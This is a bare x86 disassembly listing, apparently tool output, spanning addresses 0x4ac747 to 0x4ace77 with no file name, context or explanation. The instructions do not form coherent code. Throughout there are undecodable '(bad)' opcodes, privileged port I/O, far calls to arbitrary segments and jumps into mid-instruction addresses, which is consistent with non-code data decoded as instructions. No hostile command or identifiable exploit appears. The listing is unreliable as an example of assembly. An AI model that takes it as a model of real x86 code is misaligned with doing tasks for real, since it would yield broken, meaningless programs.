  4ac747:	add    edx,DWORD PTR [esi+0x7271095c]
  4ac74d:	push   0x36
  4ac74f:	add    dh,BYTE PTR [eax+0x17]
  4ac752:	sub    ebp,DWORD PTR [esi]
  4ac754:	mov    bh,0xf1
  4ac756:	lds    esi,FWORD PTR [ecx-0x70]
  4ac759:	jb     0x4ac753
  4ac75b:	mov    esi,0x1e35e4cd
  4ac760:	in     eax,0xba
  4ac762:	and    ecx,DWORD PTR [edx+0x7]
  4ac765:	jb     0x4ac747
  4ac767:	mov    ds:0x79cdd3b2,al
  4ac76c:	inc    ebx
  4ac76d:	clc    
  4ac76e:	xchg   esi,eax
  4ac76f:	and    BYTE PTR [esi+0x67b1445],bh
  4ac775:	add    BYTE PTR [edi+0x2ade125],0x58
  4ac77c:	pop    eax
  4ac77d:	add    ch,cl
  4ac77f:	ins    BYTE PTR es:[edi],dx
  4ac780:	retf   
  4ac781:	dec    eax
  4ac782:	sbb    al,0xe0
  4ac784:	sar    BYTE PTR [edx],cl
  4ac786:	push   ss
  4ac787:	into   
  4ac788:	in     al,dx
  4ac789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ac78a:	push   es
  4ac78b:	ret    0x9c0f
  4ac78e:	pop    ds
  4ac78f:	or     BYTE PTR [edi-0x27],ch
  4ac792:	retf   0xc0dd
  4ac795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ac796:	nop
  4ac797:	das    
  4ac798:	imul   edx,DWORD PTR [edi+ebx*1],0xeacf931
  4ac79f:	js     0x4ac768
  4ac7a1:	add    bh,BYTE PTR [ecx-0x54]
  4ac7a4:	xlat   BYTE PTR ds:[ebx]
  4ac7a5:	or     eax,0x660190d8
  4ac7aa:	sbb    BYTE PTR [edi-0x7f],0x28
  4ac7ae:	cmp    BYTE PTR [ebx+eiz*2+0x55],al
  4ac7b2:	enter  0x898,0x2f
  4ac7b6:	xchg   esp,eax
  4ac7b7:	mov    esi,0xf9e605aa
  4ac7bc:	pop    ss
  4ac7bd:	jge    0x4ac7c5
  4ac7bf:	push   0xffffffad
  4ac7c1:	adc    DWORD PTR [esi+ecx*4-0x47a6d777],ebp
  4ac7c8:	cmp    bh,BYTE PTR [edx+ecx*1-0xad6dd60]
  4ac7cf:	fisttp DWORD PTR [ebp+eax*4+0x7e]
  4ac7d3:	cli    
  4ac7d4:	data16 sub al,0xfc
  4ac7d7:	cli    
  4ac7d8:	jne    0x4ac77e
  4ac7da:	cdq    
  4ac7db:	cmp    al,0x54
  4ac7dd:	setne  BYTE PTR [eax+eax*1]
  4ac7e1:	inc    edi
  4ac7e2:	sbb    al,0x6a
  4ac7e4:	jnp    0x4ac83c
  4ac7e6:	lock inc edx
  4ac7e8:	dec    eax
  4ac7e9:	xor    BYTE PTR [eax-0x3d7ce840],al
  4ac7ef:	daa    
  4ac7f0:	or     DWORD PTR [esi+0x77],ebp
  4ac7f3:	mov    edx,ecx
  4ac7f5:	sub    BYTE PTR [ebx],0x74
  4ac7f8:	jne    0x4ac802
  4ac7fa:	sub    eax,0x25427074
  4ac7ff:	add    BYTE PTR fs:[esi+0x22],bh
  4ac803:	mov    cl,BYTE PTR [ecx]
  4ac805:	jge    0x4ac811
  4ac807:	mov    BYTE PTR [edi+0x17],dl
  4ac80a:	ret    0xa82e
  4ac80d:	cmp    al,0x27
  4ac80f:	ins    BYTE PTR es:[edi],dx
  4ac810:	test   eax,0x24ea8c68
  4ac815:	xor    al,0x5e
  4ac817:	loopne 0x4ac7d7
  4ac819:	push   es
  4ac81a:	pop    es
  4ac81b:	cmp    bl,dh
  4ac81d:	call   0x9a384390
  4ac822:	(bad)  
  4ac823:	pusha  
  4ac824:	inc    ecx
  4ac825:	imul   ebx,DWORD PTR [edx+0x75],0x830918d2
  4ac82c:	ret    
  4ac82d:	shl    DWORD PTR [eax+0x9],cl
  4ac830:	adc    al,0x4
  4ac832:	nop
  4ac833:	push   es
  4ac834:	inc    edx
  4ac835:	jo     0x4ac843
  4ac837:	lds    esi,FWORD PTR [ebx+0x743028ef]
  4ac83d:	and    ecx,DWORD PTR [edi-0x1f]
  4ac840:	dec    esi
  4ac841:	mov    DWORD PTR [ebp+0x3b],esp
  4ac844:	ins    DWORD PTR es:[edi],dx
  4ac845:	mov    ebx,0x9d130309
  4ac84a:	and    eax,0x16a9ed75
  4ac84f:	push   esi
  4ac850:	loop   0x4ac896
  4ac852:	mov    edi,eax
  4ac854:	ret    
  4ac855:	mov    edi,0x26ed50c0
  4ac85a:	jne    0x4ac887
  4ac85c:	aaa    
  4ac85d:	add    cl,0x85
  4ac860:	in     al,0x2
  4ac862:	(bad)  
  4ac863:	xchg   edx,eax
  4ac864:	dec    esp
  4ac865:	dec    esp
  4ac866:	xchg   ecx,eax
  4ac867:	aas    
  4ac868:	pop    esi
  4ac869:	sub    eax,0x2b6da73e
  4ac86e:	popf   
  4ac86f:	les    esi,FWORD PTR [ebx+ebx*8]
  4ac872:	and    BYTE PTR [edi+0x114b094a],ch
  4ac878:	imul   esi,DWORD PTR [eax+0x4e10a12e],0xffffffdc
  4ac87f:	inc    eax
  4ac880:	pop    esi
  4ac881:	add    ch,BYTE PTR [ecx+0x578d5eea]
  4ac887:	push   0x47
  4ac889:	sub    eax,0x2d
  4ac88c:	mov    edx,0x2d64b3e
  4ac891:	mov    ch,BYTE PTR [ecx-0x22]
  4ac894:	or     DWORD PTR [ecx-0x43],ebp
  4ac897:	sar    DWORD PTR [edx+0x45034fe7],0x2b
  4ac89e:	or     al,0x34
  4ac8a0:	jmp    0x4ac8cd
  4ac8a2:	or     DWORD PTR [ecx],0x38405406
  4ac8a8:	adc    esi,0x10
  4ac8ab:	popa   
  4ac8ac:	outs   dx,BYTE PTR ds:[esi]
  4ac8ad:	outs   dx,BYTE PTR ds:[esi]
  4ac8ae:	outs   dx,DWORD PTR ds:[esi]
  4ac8af:	pop    edx
  4ac8b0:	or     DWORD PTR [ecx],eax
  4ac8b2:	jmp    0x4ac8ce
  4ac8b4:	or     BYTE PTR [edx],al
  4ac8b6:	jmp    0x4ac8cd
  4ac8b8:	add    al,0xeb
  4ac8ba:	adc    BYTE PTR [ecx],ch
  4ac8bc:	jmp    0x4ac842
  4ac8be:	add    BYTE PTR ss:[esi],bh
  4ac8c1:	ret    
  4ac8c2:	jle    0x4ac844
  4ac8c4:	data16 jge 0x4ac8df
  4ac8c7:	inc    eax
  4ac8c8:	xor    ch,BYTE PTR [ecx]
  4ac8ca:	jne    0x4ac871
  4ac8cc:	mov    ecx,eax
  4ac8ce:	and    cl,BYTE PTR [ecx]
  4ac8d0:	xchg   ebx,eax
  4ac8d1:	ret    
  4ac8d2:	xchg   ebx,eax
  4ac8d3:	mov    esp,0xd47d412
  4ac8d8:	lock call 0xabba:0x2185aefe
  4ac8e0:	jecxz  0x4ac8f3
  4ac8e2:	test   al,0x56
  4ac8e4:	add    dl,0x32
  4ac8e7:	fidiv  DWORD PTR [ebp+0x29]
  4ac8ea:	(bad)  
  4ac8ec:	and    cl,BYTE PTR [esp+eax*2+0x75063a8b]
  4ac8f3:	sbb    eax,0x22068115
  4ac8f8:	mov    cl,0xa4
  4ac8fa:	pusha  
  4ac8fb:	mov    DWORD PTR [ecx],ebx
  4ac8fd:	pop    ds
  4ac8fe:	inc    eax
  4ac8ff:	mov    DWORD PTR [esp+edx*8-0xec7f35],ecx
  4ac906:	call   eax
  4ac908:	xor    edx,ecx
  4ac90a:	test   dl,0x7
  4ac90d:	je     0x4ac920
  4ac90f:	mov    cl,al
  4ac911:	mov    BYTE PTR [ebx],0x19
  4ac914:	and    cl,0x7
  4ac917:	ret    0xb5d6
  4ac91a:	je     0x4ac93b
  4ac91c:	in     eax,0x6c
  4ac91e:	jbe    0x4ac929
  4ac920:	pop    esi
  4ac921:	sub    esp,edx
  4ac923:	ret    0x8db2
  4ac926:	pop    ecx
  4ac927:	icebp  
  4ac928:	adc    BYTE PTR [eax+0x52],cl
  4ac92b:	shr    dl,0x7e
  4ac92e:	movsx  ecx,al
  4ac931:	sub    BYTE PTR [esi],dl
  4ac933:	mov    eax,ds:0x729cd5af
  4ac938:	mov    bl,0xad
  4ac93a:	or     DWORD PTR [eax-0x69ea3ff7],esi
  4ac940:	push   esi
  4ac941:	fcom   DWORD PTR [edx+edx*2+0x11e67a20]
  4ac948:	push   esp
  4ac949:	test   DWORD PTR [eax+0x24],esp
  4ac94c:	int3   
  4ac94d:	not    bl
  4ac94f:	push   es
  4ac950:	push   es
  4ac951:	nop
  4ac952:	std    
  4ac953:	mov    BYTE PTR [esp+edi*8],dh
  4ac956:	or     DWORD PTR [eax-0x3f],ebx
  4ac959:	les    esi,FWORD PTR [eax-0x467d0272]
  4ac95f:	xchg   edi,eax
  4ac960:	pop    esp
  4ac961:	std    
  4ac962:	add    eax,0x84be3839
  4ac967:	enter  0x4a02,0x9d
  4ac96b:	inc    eax
  4ac96c:	fwait
  4ac96d:	hlt    
  4ac96e:	shl    BYTE PTR [esi],1
  4ac970:	jo     0x4ac9b6
  4ac972:	fdiv   DWORD PTR [ebp+0x39]
  4ac975:	test   al,0xd6
  4ac977:	xor    bh,BYTE PTR [ecx]
  4ac979:	(bad)  
  4ac97a:	lods   eax,DWORD PTR ds:[esi]
  4ac97b:	out    0x74,al
  4ac97d:	mov    ss,WORD PTR [eax-0xfd8789]
  4ac983:	sub    BYTE PTR [ebx],bh
  4ac985:	loopne 0x4ac934
  4ac987:	dec    ebx
  4ac988:	sbb    bh,dl
  4ac98a:	ja     0x4ac99a
  4ac98c:	jnp    0x4ac991
  4ac98e:	icebp  
  4ac98f:	push   0x7568e333
  4ac994:	ins    DWORD PTR es:[edi],dx
  4ac995:	sbb    bh,BYTE PTR [eax]
  4ac997:	(bad)  
  4ac998:	mov    ds:0xf768b9f0,al
  4ac99d:	add    DWORD PTR [edi+0x77e9e3e7],esp
  4ac9a3:	dec    edx
  4ac9a4:	mov    edi,0xe0e22a2c
  4ac9a9:	or     al,0x31
  4ac9ab:	mov    edi,DWORD PTR fs:[esp+ebx*4+0x445700cd]
  4ac9b3:	inc    ebx
  4ac9b4:	fs cli 
  4ac9b6:	rcl    BYTE PTR [esi+0x3f],cl
  4ac9b9:	js     0x4ac9a5
  4ac9bb:	cmp    esp,DWORD PTR [edi-0x64]
  4ac9be:	lea    edx,[eax+ecx*1-0x6]
  4ac9c2:	into   
  4ac9c3:	scas   al,BYTE PTR es:[edi]
  4ac9c4:	adc    BYTE PTR [esi-0x39],ah
  4ac9c7:	add    eax,DWORD PTR [ebx]
  4ac9c9:	jno    0x4ac9d2
  4ac9cb:	push   esp
  4ac9cc:	xchg   BYTE PTR [esi+0x2],dl
  4ac9cf:	add    edx,DWORD PTR [ebp+0x3d]
  4ac9d2:	xor    DWORD PTR [esi-0x70c87bf4],ecx
  4ac9d8:	shr    BYTE PTR [ecx-0x69],1
  4ac9db:	mov    al,ds:0x4ddc02a0
  4ac9e0:	(bad)  
  4ac9e1:	fisttp DWORD PTR [edx+0x57]
  4ac9e4:	dec    edx
  4ac9e5:	xchg   ecx,eax
  4ac9e6:	lahf   
  4ac9e7:	xchg   esp,eax
  4ac9e8:	mov    ecx,ebp
  4ac9ea:	jmp    0x4ac975
  4ac9ec:	mov    ebx,DWORD PTR [ebp-0x3c]
  4ac9ef:	push   esi
  4ac9f0:	dec    edi
  4ac9f1:	retf   0xb29b
  4ac9f4:	push   0xd1db840f
  4ac9f9:	sbb    BYTE PTR [ecx],cl
  4ac9fb:	pop    DWORD PTR [edx]
  4ac9fd:	sahf   
  4ac9fe:	call   0x25ced7ca
  4aca03:	pop    edx
  4aca04:	fld    QWORD PTR [edi+0x5d]
  4aca07:	jl     0x4aca5c
  4aca09:	cmp    eax,0x512fa424
  4aca0e:	cdq    
  4aca0f:	sub    eax,0x733b8094
  4aca14:	je     0x4ac9f3
  4aca16:	pop    ss
  4aca17:	lock mov eax,0x15211ceb
  4aca1d:	adc    DWORD PTR [esi-0x23],eax
  4aca20:	inc    edi
  4aca21:	xor    al,dh
  4aca23:	je     0x4ac9b9
  4aca25:	(bad)  
  4aca26:	or     eax,DWORD PTR [ebp-0x70]
  4aca29:	shr    BYTE PTR [ebx+0x54],1
  4aca2c:	(bad)  
  4aca2f:	js     0xbc5d88b0
  4aca35:	leave  
  4aca36:	xor    BYTE PTR [edi+0x48],dh
  4aca39:	or     ch,al
  4aca3b:	fs in  eax,dx
  4aca3d:	dec    eax
  4aca3e:	adc    esi,DWORD PTR [ecx-0x12]
  4aca41:	push   ebx
  4aca42:	cmp    BYTE PTR [ecx+0x15],bl
  4aca45:	cmp    al,0x31
  4aca47:	push   edx
  4aca48:	or     BYTE PTR [ebp+0x18],cl
  4aca4b:	xlat   BYTE PTR ds:[ebx]
  4aca4c:	rol    DWORD PTR [edi+ecx*1+0x1f207454],0xcf
  4aca54:	mov    eax,ds:0x422e1170
  4aca59:	sbb    eax,0x2d71e48e
  4aca5e:	adc    al,0xa6
  4aca60:	adc    ah,BYTE PTR [eax]
  4aca62:	dec    edi
  4aca63:	cwde   
  4aca64:	sbb    BYTE PTR [ecx+0x393b70a4],bh
  4aca6a:	inc    esi
  4aca6b:	call   0xedcdc06
  4aca70:	test   BYTE PTR [edi+0xf],dh
  4aca73:	popa   
  4aca74:	jbe    0x4aca5c
  4aca76:	adc    eax,0x75768508
  4aca7b:	mov    esp,0xc1e68405
  4aca80:	cmp    DWORD PTR [edx-0x50159596],ebx
  4aca86:	sbb    al,0xe6
  4aca88:	imul   BYTE PTR ds:0xa102d454
  4aca8e:	cmp    dl,0x3c
  4aca91:	je     0x4acaa1
  4aca93:	or     BYTE PTR [edi],ah
  4aca95:	je     0x4acaa0
  4aca97:	xor    ah,BYTE PTR [ecx+0x37]
  4aca9a:	mov    dh,0x7b
  4aca9c:	sub    al,BYTE PTR [ebp+0x2]
  4aca9f:	push   edi
  4acaa0:	(bad)  
  4acaa1:	or     ecx,DWORD PTR [esi]
  4acaa3:	jno    0x4acad8
  4acaa5:	mov    BYTE PTR [edi],0xba
  4acaa8:	ds ss push cs
  4acaab:	mov    ds:0x39a8273c,al
  4acab0:	rol    BYTE PTR [eax],0x52
  4acab3:	ss stos BYTE PTR es:[edi],al
  4acab5:	jge    0x4aca56
  4acab7:	jno    0x4acacd
  4acab9:	jb     0x4acabb
  4acabb:	mov    ecx,0x8b0f5c10
  4acac0:	clc    
  4acac1:	or     ebx,eax
  4acac3:	mov    ecx,es
  4acac5:	das    
  4acac6:	add    ebp,eax
  4acac8:	inc    ebp
  4acac9:	loopne 0x4aca85
  4acacb:	xchg   esi,eax
  4acacc:	xor    BYTE PTR [edi+eax*8+0x60],cl
  4acad0:	(bad)  
  4acad1:	jmp    0x4acadc
  4acad3:	mul    ebx
  4acad5:	add    al,0x14
  4acad7:	or     al,BYTE PTR ds:[ebp+0x4e1314f7]
  4acade:	je     0x4acada
  4acae0:	pushf  
  4acae1:	(bad)  
  4acae2:	mov    cl,0xf8
  4acae4:	lahf   
  4acae5:	sbb    al,0xb2
  4acae7:	pop    ss
  4acae8:	and    al,0x54
  4acaea:	test   BYTE PTR [edi-0x163d6f8a],ah
  4acaf0:	adc    esp,esi
  4acaf2:	call   0xe0d4e775
  4acaf7:	mov    edi,0x101435e0
  4acafc:	jl     0x4acb6e
  4acafe:	xor    al,0x4e
  4acb00:	sbb    al,0xc1
  4acb02:	sub    BYTE PTR [eax+0x5c],ch
  4acb05:	push   0xffffff8f
  4acb07:	outs   dx,DWORD PTR ds:[esi]
  4acb08:	stos   DWORD PTR es:[edi],eax
  4acb09:	mov    WORD PTR [ebp+0x30],es
  4acb0c:	mov    ds:0xcca100a5,eax
  4acb11:	clc    
  4acb12:	jnp    0x4acb59
  4acb14:	push   DWORD PTR [ebp+0x9]
  4acb17:	cmp    BYTE PTR cs:[edi+edx*1+0x2],al
  4acb1c:	adc    DWORD PTR [edi-0x2fa1039a],esi
  4acb22:	mov    ecx,DWORD PTR [edi]
  4acb24:	jge    0x4acb37
  4acb26:	adc    esp,ebx
  4acb28:	xchg   BYTE PTR [ebx+0x63],dl
  4acb2b:	or     bl,BYTE PTR [esi+eiz*8+0x3ce1530c]
  4acb32:	jecxz  0x4acb86
  4acb34:	pusha  
  4acb35:	mov    ds:0x4229e602,al
  4acb3a:	jmp    0x6895956
  4acb3f:	and    al,0xa4
  4acb41:	add    BYTE PTR [esi],bh
  4acb43:	mov    bh,0x14
  4acb45:	and    esp,DWORD PTR [eax]
  4acb47:	sbb    ah,BYTE PTR [edx]
  4acb49:	test   al,0xa6
  4acb4b:	and    dl,BYTE PTR [ebp+0x4a]
  4acb4e:	shr    al,0xe9
  4acb51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4acb52:	daa    
  4acb53:	repnz aaa 
  4acb55:	inc    ebx
  4acb56:	ret    0xbe08
  4acb59:	inc    edi
  4acb5a:	mov    ds:0x7752144e,al
  4acb5f:	jo     0x4acb48
  4acb61:	push   es
  4acb62:	das    
  4acb63:	add    bl,dh
  4acb65:	push   es
  4acb66:	dec    edx
  4acb67:	xor    al,0x50
  4acb69:	ret    0x892d
  4acb6c:	popa   
  4acb6d:	ja     0x4acb47
  4acb6f:	(bad)  
  4acb70:	xor    al,0x38
  4acb72:	mov    eax,0x78ec23d3
  4acb77:	retf   
  4acb78:	mov    ebx,0x4f5a823
  4acb7d:	adc    BYTE PTR ds:[esp+edx*1],0x8
  4acb82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4acb83:	xor    al,al
  4acb85:	or     BYTE PTR ds:0xb41ee8f6,dl
  4acb8b:	stos   DWORD PTR es:[edi],eax
  4acb8c:	mov    ah,0x3
  4acb8e:	fmul   QWORD PTR [eax-0x3c7577f6]
  4acb94:	sub    bh,BYTE PTR [esi]
  4acb96:	add    al,0x6a
  4acb98:	pop    es
  4acb99:	ror    BYTE PTR [eax+0x24],0x1f
  4acb9d:	jmp    0x4acbcc
  4acb9f:	jne    0x4acbc0
  4acba1:	fistp  DWORD PTR [edx+0x75a54885]
  4acba7:	and    DWORD PTR [esi-0x151ff5e8],esi
  4acbad:	push   edx
  4acbae:	fcom   DWORD PTR [esi+0x0]
  4acbb1:	jne    0x4acbb7
  4acbb3:	into   
  4acbb4:	push   ds
  4acbb5:	clc    
  4acbb6:	popa   
  4acbb7:	push   ebx
  4acbb8:	mov    ch,0x85
  4acbba:	call   0x5781:0xb803f423
  4acbc1:	or     al,0x5d
  4acbc3:	add    BYTE PTR [esi],al
  4acbc5:	push   edx
  4acbc6:	mov    eax,0xb5c45fbe
  4acbcb:	ret    0x9c3
  4acbce:	cmp    eax,0x8846a2fb
  4acbd3:	xchg   ecx,eax
  4acbd4:	mov    eax,0xfc43d5e0
  4acbd9:	xor    al,0xfd
  4acbdb:	push   ebp
  4acbdc:	xchg   BYTE PTR [ebx-0x1],al
  4acbdf:	push   es
  4acbe0:	shr    DWORD PTR [edi],1
  4acbe2:	dec    eax
  4acbe3:	fsub   st,st(1)
  4acbe5:	pushf  
  4acbe6:	or     ebx,eax
  4acbe8:	add    edi,esp
  4acbea:	sbb    eax,0x85222e53
  4acbef:	xor    esp,DWORD PTR [ebx]
  4acbf1:	mov    dl,0xb2
  4acbf3:	lock push ebp
  4acbf5:	rol    BYTE PTR [eax+eax*2+0x6afdddb9],cl
  4acbfc:	loop   0x4acc20
  4acbfe:	aam    0xac
  4acc00:	sar    eax,cl
  4acc02:	push   cs
  4acc03:	dec    esi
  4acc04:	xor    al,0x18
  4acc06:	pop    edi
  4acc07:	and    dl,BYTE PTR [ecx-0x78]
  4acc0a:	dec    esi
  4acc0b:	scas   al,BYTE PTR es:[edi]
  4acc0c:	xchg   ebx,eax
  4acc0d:	shl    BYTE PTR [edi-0x7bf624ef],cl
  4acc13:	mov    al,0x43
  4acc15:	xor    dl,BYTE PTR [eax+0x4e]
  4acc18:	cmp    al,0x24
  4acc1a:	cmp    BYTE PTR [ebx-0x5a],cl
  4acc1d:	sahf   
  4acc1e:	or     bl,bh
  4acc20:	sbb    BYTE PTR [ecx],0x8
  4acc23:	dec    ebp
  4acc24:	(bad)  
  4acc25:	mov    bh,0x32
  4acc27:	js     0x4acc80
  4acc29:	les    esi,FWORD PTR ds:0xf138e0e4
  4acc2f:	adc    ecx,DWORD PTR [ecx]
  4acc31:	dec    ecx
  4acc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4acc33:	or     bh,BYTE PTR [edi]
  4acc35:	stos   DWORD PTR es:[edi],eax
  4acc36:	cmp    ebx,DWORD PTR [edi+0x4750832a]
  4acc3c:	dec    ebp
  4acc3d:	push   ss
  4acc3e:	je     0x6a0cdd15
  4acc44:	cs dec ebp
  4acc46:	bswap  eax
  4acc48:	adc    BYTE PTR [edi-0x447aa7f4],bh
  4acc4e:	pop    esp
  4acc4f:	or     ah,bh
  4acc51:	bound  edi,QWORD PTR [edi+eax*1-0x4b]
  4acc55:	lea    esi,ds:0xf68abe24
  4acc5b:	fsubr  DWORD PTR [edi+0x43]
  4acc5e:	add    DWORD PTR [esi],0xe
  4acc61:	test   BYTE PTR [ebx+0x40],ah
  4acc64:	pop    ds
  4acc65:	nop
  4acc66:	sbb    bl,BYTE PTR [ebx]
  4acc68:	cmp    BYTE PTR [eax],dl
  4acc6a:	out    0x15,al
  4acc6c:	push   eax
  4acc6d:	and    DWORD PTR [eax],0xfac0dd3
  4acc73:	or     DWORD PTR [ebp-0x7ec7ff98],eax
  4acc79:	je     0x4acc0c
  4acc7b:	enter  0x8370,0x1d
  4acc7f:	pop    eax
  4acc80:	mov    bh,BYTE PTR [ecx]
  4acc82:	sbb    bh,BYTE PTR [edx+0xb]
  4acc85:	inc    esi
  4acc86:	dec    esp
  4acc87:	dec    eax
  4acc88:	lods   al,BYTE PTR ds:[esi]
  4acc89:	cdq    
  4acc8a:	pop    eax
  4acc8b:	imul   edi,DWORD PTR [edi-0x31],0xffffffc4
  4acc8f:	jnp    0x4acc72
  4acc91:	jo     0x4accd7
  4acc93:	dec    edx
  4acc94:	push   es
  4acc95:	(bad)  
  4acc96:	jne    0x4accc0
  4acc98:	js     0x4acc9a
  4acc9a:	mov    dh,0xd
  4acc9c:	push   edi
  4acc9d:	or     eax,0x9c724acf
  4acca2:	inc    eax
  4acca3:	inc    ecx
  4acca4:	xor    al,0xd6
  4acca6:	test   BYTE PTR [ecx-0x38ebe80c],dl
  4accac:	test   esi,eax
  4accae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4accaf:	(bad)  
  4accb0:	pop    ebx
  4accb1:	mov    edi,0xa08c2cc8
  4accb6:	mov    bl,0x54
  4accb8:	into   
  4accb9:	test   BYTE PTR [edx],cl
  4accbb:	adc    BYTE PTR [eax-0x56],ch
  4accbe:	lods   al,BYTE PTR ds:[esi]
  4accbf:	loopne 0x4acc8e
  4accc1:	addr16 rol ebx,0x7
  4accc5:	and    BYTE PTR [ebp+0x2ca0103],bh
  4acccb:	ja     0x4acccf
  4acccd:	push   eax
  4accce:	push   ebp
  4acccf:	mov    WORD PTR [esi-0x2232917d],?
  4accd5:	and    al,0xa
  4accd7:	jge    0xe049f87d
  4accdd:	in     al,dx
  4accde:	inc    esp
  4accdf:	fsub   DWORD PTR [eax-0x2f]
  4acce2:	sbb    ah,bl
  4acce4:	cmp    BYTE PTR [eax-0x36],ah
  4acce7:	mov    WORD PTR fs:[eax+edx*1-0x2bdbfb34],cs
  4accef:	dec    edx
  4accf0:	out    dx,al
  4accf1:	cli    
  4accf2:	lods   al,BYTE PTR ds:[esi]
  4accf3:	sub    al,0x60
  4accf5:	and    BYTE PTR [edi-0x10],dl
  4accf8:	inc    ebp
  4accf9:	jae    0x4acd1a
  4accfb:	and    eax,0xc2c14907
  4acd00:	js     0x4acd20
  4acd02:	pop    es
  4acd03:	xchg   edx,eax
  4acd04:	or     edi,DWORD PTR [ecx+0x6080386]
  4acd0a:	pop    es
  4acd0b:	leave  
  4acd0c:	lds    ecx,FWORD PTR [esi]
  4acd0e:	or     DWORD PTR [ebx+0x37],ebx
  4acd11:	adc    al,0x2d
  4acd13:	push   edx
  4acd14:	jb     0x4acd37
  4acd16:	cmp    al,0x32
  4acd18:	push   edi
  4acd19:	jo     0x4acd66
  4acd1b:	scas   al,BYTE PTR es:[edi]
  4acd1c:	popa   
  4acd1d:	inc    edx
  4acd1e:	xor    cl,BYTE PTR [ebp+0x3b]
  4acd21:	jo     0x4acd43
  4acd23:	adc    eax,DWORD PTR [ebx+edi*2]
  4acd26:	sbb    al,0x4f
  4acd28:	fadd   DWORD PTR es:[ecx+0x52]
  4acd2c:	and    BYTE PTR [edx],bl
  4acd2e:	cmp    cl,BYTE PTR [ebx-0x67d5e9f1]
  4acd34:	sbb    dl,BYTE PTR [edi-0x5198aaf1]
  4acd3a:	clc    
  4acd3b:	or     BYTE PTR [edi+ebp*4-0x76dca314],cl
  4acd42:	add    DWORD PTR [eax+0x3080609],edx
  4acd48:	inc    edi
  4acd49:	add    eax,0x18b92918
  4acd4e:	es daa 
  4acd50:	push   ebp
  4acd51:	and    bh,BYTE PTR es:[eax+0x2a5b6b90]
  4acd58:	xor    DWORD PTR [ebx-0x70],ebx
  4acd5b:	or     ebx,DWORD PTR [ecx]
  4acd5d:	push   ss
  4acd5e:	mov    ebp,0x9299412b
  4acd63:	sbb    DWORD PTR [esi],ebp
  4acd65:	dec    edi
  4acd66:	and    DWORD PTR [esi+esi*1],ecx
  4acd69:	and    BYTE PTR fs:[eax+0x28],0x1b
  4acd6e:	mov    cl,0xe
  4acd70:	inc    ebp
  4acd71:	add    bh,BYTE PTR [ecx+0x411d5bb6]
  4acd77:	and    eax,0x3e05c117
  4acd7c:	fild   QWORD PTR [edx]
  4acd7e:	ins    BYTE PTR es:[edi],dx
  4acd7f:	sub    bl,BYTE PTR [eax+0x284d0f0c]
  4acd85:	ret    
  4acd86:	sbb    BYTE PTR [ebp-0x6fd2ecdc],cl
  4acd8c:	outs   dx,DWORD PTR ds:[esi]
  4acd8d:	and    esp,edx
  4acd8f:	push   0x533d018a
  4acd94:	mov    bl,0xd9
  4acd96:	or     dh,al
  4acd98:	call   DWORD PTR [edi-0x3]
  4acd9b:	inc    esp
  4acd9c:	(bad)  
  4acd9e:	push   es
  4acd9f:	pop    edi
  4acda0:	jmp    0x4acd22
  4acda2:	loope  0x4acd3e
  4acda4:	iret   
  4acda5:	jnp    0x4acdf6
  4acda7:	mov    DWORD PTR [esi+ebx*1+0x30f80e99],ebx
  4acdae:	hlt    
  4acdaf:	aam    0x33
  4acdb1:	cwde   
  4acdb2:	iret   
  4acdb3:	jnp    0x4ace0c
  4acdb5:	es dec ebp
  4acdb7:	loope  0x4acd89
  4acdb9:	mov    WORD PTR [ecx],es
  4acdbb:	and    al,0xcd
  4acdbd:	fist   WORD PTR [ecx+eax*1+0x34]
  4acdc1:	add    al,BYTE PTR [eax]
  4acdc3:	add    eax,DWORD PTR [eax*1+0x362b024b]
  4acdca:	push   es
  4acdcb:	ins    DWORD PTR es:[edi],dx
  4acdcc:	outs   dx,BYTE PTR ds:[esi]
  4acdcd:	pop    edi
  4acdce:	or     ebx,DWORD PTR [eax]
  4acdd0:	push   0xad400bad
  4acdd5:	fadd   DWORD PTR [ecx+ebp*2+0x3e]
  4acdd9:	int    0x67
  4acddb:	or     al,0x6
  4acddd:	dec    esp
  4acdde:	fldenv [edx]
  4acde0:	lock fmul st,st(7)
  4acde3:	cmp    eax,0xd2f204ed
  4acde8:	fdiv   st(0),st
  4acdea:	fimul  DWORD PTR [esi-0x79]
  4acded:	push   ebp
  4acdee:	out    0x79,eax
  4acdf0:	call   0xeaa4:0x61316ef
  4acdf7:	lods   al,BYTE PTR ds:[esi]
  4acdf8:	mov    ah,0xbc
  4acdfa:	sahf   
  4acdfb:	out    0x79,eax
  4acdfd:	sahf   
  4acdfe:	fneni(8087 only) 
  4ace00:	in     eax,0xea
  4ace02:	(bad)  
  4ace03:	int3   
  4ace04:	setle  bh
  4ace07:	jns    0x4acdda
  4ace09:	(bad)  
  4ace0a:	out    dx,eax
  4ace0b:	add    BYTE PTR [edx-0x1f60f3fe],ah
  4ace11:	jns    0x4acd95
  4ace13:	add    ecx,DWORD PTR [ebx+0x7050c04]
  4ace19:	or     BYTE PTR [si],cl
  4ace1c:	or     DWORD PTR [ebx+esi*4],ecx
  4ace1f:	ins    DWORD PTR es:[edi],dx
  4ace20:	push   ds
  4ace21:	xor    al,0xb
  4ace23:	cs mov dh,al
  4ace26:	in     ax,dx
  4ace28:	push   es
  4ace29:	hlt    
  4ace2a:	repz int 0xb3
  4ace2d:	jge    0x4ace8d
  4ace2f:	rcl    BYTE PTR [esi],1
  4ace31:	leave  
  4ace32:	or     esp,esi
  4ace34:	push   es
  4ace35:	mov    bl,0xed
  4ace37:	lock cmp BYTE PTR [edi+eiz*8-0xec8c197],0x4a
  4ace40:	rol    DWORD PTR ds:0x4b73ac36,cl
  4ace46:	cli    
  4ace47:	sti    
  4ace48:	or     eax,0x10ebef6
  4ace4d:	push   cs
  4ace4e:	push   cs
  4ace4f:	bound  ecx,QWORD PTR [eax]
  4ace51:	aam    0xe1
  4ace53:	mov    cl,0x73
  4ace55:	add    eax,0x601050e
  4ace5a:	push   cs
  4ace5b:	fadd   DWORD PTR es:[esp+edi*2+0xe0a08db]
  4ace63:	add    edi,ecx
  4ace65:	repz fisub WORD PTR [ecx]
  4ace68:	or     eax,0x646be41
  4ace6d:	data16 outs dx,BYTE PTR ds:[esi]
  4ace6f:	push   edx
  4ace70:	cmp    cl,dh
  4ace72:	repz cmp al,0x57
  4ace75:	pop    esp
  4ace76:	popa   
  4ace77:	je     0x4acebe
